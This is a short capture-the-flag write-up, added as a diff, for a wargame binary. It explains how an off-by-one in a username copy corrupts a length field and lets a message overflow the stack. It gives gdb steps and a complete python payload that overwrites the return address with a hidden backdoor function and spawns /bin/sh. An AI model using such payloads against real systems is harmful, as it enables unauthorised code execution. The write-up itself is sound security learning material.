@@ -1,0 +1,24 @@
+start ssh connection with ssh -p 4242 level08@127.0.0.1 use flag from level07
+
+this time PIE is on so we can not see the programm without running, moreover it is better to start with start/starti command - we can not set a breakpoint from the outside because the entrypoint is unresolved
+
+the programm (see source) ask for your username, wellcomes you, asks for msg and writes that it is sent
+
+programm uses struct that consists of msg (140 symbols), username (40 symbols) and lenght
+we can overflow at the cycle of set_username funtion because it writes 1 more char then username can hold and it overflows lenght
+
+this leads to ability to overflow the message because fgets lets us read 1024 and strncpy funtion that copies everything to msg[140] is limited by len
+if we overflow username with char > 140 message can be overflowed - we can enter 255
+start <<<$(python -c 'print "U"*40+"\xff"+"\n"+"A"*255')
+<<< inputs to gdb like from bash to stdin
+
+the problem is that this time segfault doesn't give us any information but we have a very convenient msg_handle function
+it's stack consists only from structure we are currently overflowing (although formally we are in set_msg, it works with a pointer from handle_msg)
+struct size is 184 and we should add 16 bytes to fill RBP on our way to return pointer - 200
+
+the programm has (info funtions) 1 hidden function secret_backdoor that leads to system(input from fgets) form which is our aim
+it's address is 0x000055555555488c (info functions secret_backdoor) - it is enough to fill the return pointer with this address
+
+(python -c 'print "U"*40+"\xff\n"+"A"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00\n/bin/sh\n"'; cat) | ./level09
+
+go to ../end and check flag in .pass - success!
